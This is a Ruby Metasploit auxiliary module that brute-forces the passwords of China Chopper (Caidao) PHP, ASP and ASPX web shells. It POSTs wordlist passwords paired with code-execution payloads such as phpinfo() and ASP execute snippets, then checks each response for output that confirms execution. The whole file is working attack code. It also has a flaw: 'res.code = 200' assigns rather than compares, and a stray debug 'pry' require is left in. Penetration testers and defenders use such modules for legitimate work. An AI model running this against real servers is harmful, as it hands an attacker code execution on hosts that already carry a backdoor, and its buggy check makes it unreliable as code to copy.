##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'pry'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'Chinese Caidao Backdoor Bruteforce',
      'Description'    => 'This module attempts to brute chinese caidao php/asp/aspx backdoor.',
      'Author'         => [ 'Nixawk' ],
      'References'     => 
        [
              [ 'URL', 'http://blog.csdn.net/nixawk/article/details/40430329']
        ],
      'License'        => MSF_LICENSE,  
    )

    register_options(
      [
        OptPath.new('PASS_FILE', 
                    [ true, 
                      "File containing passwords, one per line", 
                      File.join(Msf::Config.data_directory, 'wordlists', 'CN_backdoor_passwords.txt') 
                    ]
                   ),
        OptString.new('TARGETURI', 
                      [ true, 
                        "The URI to authenticate against", 
                        "/backdoor.php" ]
                     ),
        OptEnum.new('HTTP_METHOD', 
                    [ true, 
                      "HTTP Methods for bruteforce, only POST", 
                      "POST",
                     ["POST"]]
                   ),
        OptEnum.new('TYPE',
                   [ true,
                      "backdoor type",
                      "PHP",
                     ["PHP", "ASP", "ASPX"]
                   ])
      ], self.class)
    register_autofilter_ports([ 80, 443, 8080, 8081, 8000, 8008, 8443, 8444, 8880, 8888 ])
  end

  def backdoor_brute(method, uri, wdl, payload, regexp)

    File.open(wdl).each_line do |password|
        password = password.chomp

        puts "#{peer}: #{method} #{uri} password : #{password}"

        res = send_request_cgi({
          'method'    => "#{method}",
          'uri'       => "#{uri}",
          'data'      => "#{password}=#{payload}"
        })

        unless res
          print_status("#{peer}: connection timed out")
          return
        end

        unless res.body
          print_status("#{peer}: no body here")
          return
        end

        if res.code = 200 and regexp.match(res.body)
          print_good("#{rhost}:#{rport} - [password: #{password}]\n")
          return "#{password}"
        end
    end
  end

  def run_host(ip)
    method = datastore['HTTP_METHOD']

    uri = normalize_uri(target_uri.path)
    wdl = datastore['PASS_FILE']
    typ = datastore['TYPE']

    payload = ""
    regexp = ""

    case typ
    when /php$/mi
      print_status('crack php backdoor')

      payload = "phpinfo();"
      regexp = /<title>phpinfo\(\)<\/title>/mi

    when /asp$/mi
      print_status('crack asp backdoor')

      payload = 'execute("response.write(""woo""):response.write(Len(""admin"")):response.write(""woo""):response.end")'
      regexp = /woo5woo/mi

    when /aspx$/mi
      print_status('crack aspx backdoor')

      payload = 'Response.Write("woo");Response.Write(1+4);Response.Write("woo")'
      regexp = /woo5woo/mi

    else
      print_error('no support')  
    end

    backdoor_brute(method,
                   uri,
                   wdl,
                   payload,
                   regexp)
  end
end  
